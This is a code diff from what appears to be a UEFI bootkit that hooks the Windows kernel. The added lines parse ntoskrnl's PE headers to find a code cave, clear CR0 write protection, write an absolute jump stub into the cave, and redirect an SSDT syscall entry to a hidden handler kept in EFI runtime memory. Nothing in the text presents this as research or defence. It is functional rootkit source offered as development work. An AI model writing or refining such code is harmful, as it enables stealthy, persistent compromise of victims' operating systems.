@@ -36,8 +36,12 @@ static PAYLOAD_CONTEXT *gPayloadCtx = NULL;
  * Called from the winload trampoline with:
  *   rcx = ntoskrnl base address
  *   rdx = ntoskrnl size
+ *   r8  = payload physical base address
+ *   r9  = payload allocation size (bytes)
  */
-void __attribute__((section(".text"))) PayloadEntry(PVOID NtoskrnlBase, UINTN NtoskrnlSize)
+void __attribute__((section(".text"))) PayloadEntry(
+    PVOID NtoskrnlBase, UINTN NtoskrnlSize,
+    PVOID PayloadBase, UINTN PayloadAllocSize)
 {
     static PAYLOAD_CONTEXT Ctx;
     gPayloadCtx = &Ctx;
@@ -45,6 +49,8 @@ void __attribute__((section(".text"))) PayloadEntry(PVOID NtoskrnlBase, UINTN Nt
     Ctx.Magic        = 0xDEADC0DE;
     Ctx.NtoskrnlBase = NtoskrnlBase;
     Ctx.NtoskrnlSize = NtoskrnlSize;
+    Ctx.PayloadBase  = PayloadBase;
+    Ctx.PayloadSize  = PayloadAllocSize;
     Ctx.Initialized  = 0;
     Ctx.Hidden       = 0;
 
@@ -435,13 +441,61 @@ FoundSsdt:
     sOrigSyscallHandler = (uint8_t *)ServiceTable + OrigOffset;
     Ctx->SyscallOriginal = sOrigSyscallHandler;
 
-    /* calculate new offset */
-    /* disable write protection on the SSDT page */
+    /*
+     * SSDT entries are 32-bit relative offsets (shifted by 4), giving
+     * a range of ±128MB from the service table. Our handler lives in
+     * EFI Runtime memory which can be GBs away. We solve this by
+     * writing a 12-byte absolute jmp stub in a code cave inside
+     * ntoskrnl's .text section, then pointing the SSDT at the stub.
+     */
+
+    /* find .text section in ntoskrnl PE */
+    uint32_t PeOff = *(uint32_t *)(Base + 0x3C);
+    uint8_t *PeHdr = Base + PeOff;
+    uint16_t NumSec = *(uint16_t *)(PeHdr + 4 + 2);
+    uint16_t OptSz  = *(uint16_t *)(PeHdr + 4 + 16);
+    uint8_t *SecArr = PeHdr + 4 + 20 + OptSz;
+
+    uint8_t *Cave = NULL;
+    for (uint16_t s = 0; s < NumSec; s++) {
+        uint8_t *Sh = SecArr + s * 40;
+        if (Sh[0]=='.' && Sh[1]=='t' && Sh[2]=='e' && Sh[3]=='x' && Sh[4]=='t') {
+            uint32_t SecVA   = *(uint32_t *)(Sh + 12);
+            uint32_t SecVSz  = *(uint32_t *)(Sh + 8);
+            uint8_t *SecEnd  = Base + SecVA + SecVSz;
+
+            int RunLen = 0;
+            for (int off = 1; off < 0x2000 && off < (int)SecVSz; off++) {
+                uint8_t b = SecEnd[-off];
+                if (b == 0xCC || b == 0x00) {
+                    RunLen++;
+                    if (RunLen >= 14) {
+                        Cave = SecEnd - off;
+                        break;
+                    }
+                } else {
+                    RunLen = 0;
+                }
+            }
+            break;
+        }
+    }
+
+    if (!Cave)
+        return;
+
+    /* disable write protection */
     uint64_t Cr0;
     __asm__ volatile("mov %%cr0, %0" : "=r"(Cr0));
     __asm__ volatile("mov %0, %%cr0" :: "r"(Cr0 & ~CR0_WP));
 
-    int32_t NewOffset = (int32_t)((uint8_t *)HookedSyscallHandler - (uint8_t *)ServiceTable);
+    /* write absolute jmp stub in the code cave: mov rax, imm64; jmp rax */
+    Cave[0] = 0x48; Cave[1] = 0xB8;
+    *(uint64_t *)(Cave + 2) = (uint64_t)HookedSyscallHandler;
+    Cave[10] = 0xFF; Cave[11] = 0xE0;
+
+    /* point SSDT entry at the cave stub (which is within ±128MB of SSDT) */
+    int32_t NewOffset = (int32_t)((uint8_t *)Cave - (uint8_t *)ServiceTable);
     uint8_t ArgCount = ServiceTable[TargetIndex] & 0xF;
     ServiceTable[TargetIndex] = ((uint32_t)NewOffset << 4) | ArgCount;
 
